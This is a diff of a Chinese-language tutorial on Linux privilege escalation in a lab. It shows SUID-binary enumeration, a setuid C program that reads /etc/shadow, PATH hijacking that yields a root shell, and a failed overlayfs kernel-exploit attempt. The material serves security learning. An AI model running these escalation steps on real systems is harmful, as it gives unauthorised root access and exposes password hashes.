@@ -18,11 +18,141 @@ Linux中可以参考这篇文章，[Linux提权一文通](https://www.freebuf.co
 
 
 
+# 提权方式
+
+## SUID提权
+
+SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。
+
+SUID是一种对二进制程序进行设置的特殊权限，可以让二进制程序的执行者临时拥有属主的权限（仅对拥有执行权限的二进制程序有效）。
+
+因此这只是一种**有条件**的、**临时的特殊权限授权方法**。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行提权。
+
+>  这很像我们在古装剧中见到的手持尚方宝剑的钦差大臣，他手持的尚方宝剑代表的是皇上的权威，因此可以惩戒贪官，但这并不意味着他永久成为了皇上。
+
+### 查看SUID文件
+
+查看Linux系统上所属组未root的所有SUID可执行文件。
+
+```
+find / -user root -perm -4000 -print 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -user root -perm -4000 -exec ls -ldb {} ;
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828091644.png)
+
+随便找一个来查看
+
+```
+hancool@ubuntu:~$ ls -sl /bin/ping
+44 -rwsr-xr-x 1 root root 44168 May  8  2014 /bin/ping
+```
+
+可以看到这里的权限是`rwsr`，这就表明该文件具有SUID权限。
+
+> ls命令参数
+>
+> -l：除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来
+>
+> -s：–size 以块大小为单位列出所有文件的大小
 
 
-# 演示
 
-## 查看系统版本
+### 漏洞演示
+
+```
+vim suid.c
+```
+
+```c
+#include<stdlib.h>
+#include <unistd.h>
+int main()
+{
+setuid(0);//run as root
+system("id");
+system("cat /etc/shadow");
+}
+```
+
+编译
+
+```
+gcc suid.c -o suid-exp
+```
+
+加上SUID权限位
+
+```
+chmod 4775 suid-exp
+```
+
+切换到普通用户去执行
+
+```
+su hacker
+```
+
+可以看到当我们用hacker用户去执行suid_exp可执行文件后，hacker用户的uid和组都变成了root用户和root组。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828095330.png)
+
+通过以上演示，可以知道确实存在SUID权限方面的漏洞，并且我们通过命令查找到有很多SUID文件，那么我们就要利用好这些“尚方宝剑”。
+
+### 漏洞利用
+
+```
+echo "/bin/bash cat" > cat && chmod 777 cat
+```
+
+查看添加当前环境变量
+
+```
+hacker@webper-virtual-machine:/tmp$ echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+```
+
+并将当前目录添加到环境变量中
+
+```
+hacker@webper-virtual-machine:/tmp$ export PATH=.:$PATH
+```
+
+再次查看添加当前环境变量，可以看到`/usr/local/sbin`多了一个`.`，也就是当前目录
+
+```
+hacker@webper-virtual-machine:/tmp$ echo $PATH
+.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/
+```
+
+执行suid_exp文件
+
+```
+hacker@webper-virtual-machine:/tmp$ ./suid_exp 
+uid=0(root) gid=1001(hacker) 组=1001(hacker)
+root@webper-virtual-machine:/tmp#
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828104726.png)
+
+可以看到这里已经从hacker用户切换到了root用户，说明已经提权成功，但是不知道为什么没有执行脚本里面的cat命令。
+
+```
+system("cat /etc/shadow");
+```
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828110946.png)
+
+并且切换了其他Ubuntu靶机也没有执行成功，好奇怪。通过仔细检查教程中的C源码发现，`cat`命令其实是`/bin/bash`命令，所以当然没有任何输出。小伙伴们，那你们觉得怎么改才能看到`/etc/shadow`中的内容呢？
+
+现在我们已经提权成功，所以可以为所欲为了。
+
+
+
+## 内核漏洞
+
+查看系统版本
 
 ```
 webper@webper-virtual-machine:~$ uname -a
@@ -39,9 +169,9 @@ Linux webper-virtual-machine 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24
 
 可以看到脚本开头是注释，介绍了该exp的使用方法，下面是C语言的代码。我们将完整代码复制到目标服务器上，或保存到本地再上传到目标服务器，按照使用方法去执行。
 
-## 查找存放目录
+查找存放目录
 
-在Linux下，`/var/tmp`目录是黑客最喜欢的目录，因为这里的目录权限比较高，任意用户都可以读写和执行。
+在Linux下，`/var/tmp`与`tmp`目录是黑客最喜欢的目录，因为这里的目录权限比较高，任意用户都可以读写和执行。
 
 ```
 hacker@webper-virtual-machine:/var$ ls -l
@@ -72,8 +202,6 @@ hacker@webper-virtual-machine:/var/tmp$ ls -l
 -rw------- 1 root   root    799  4月  7  2019 phpmyadmin.phpmyadmin.2019-04-07-10.18.mysql.ct3QHG
 ```
 
-## 提权
-
 然后我们可以按照文本开头的方法开始执行提权操作。
 
 ```
@@ -89,4 +217,10 @@ child threads done
 exploit failed
 ```
 
-额，翻车了，先去上班吧，回头再看。
+这里执行失败了，去查看exploit-db的漏洞说明，这里明显表示受影响的内核版本是大于3.13.0和小于3.19之间的。
+
+```
+Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
+```
+
+而上面`uname -a`发现内核版本刚好是3.19，不在受影响版本的区间范围，应该是后面的版本将此漏洞进行了修复，所有这里复现失败。
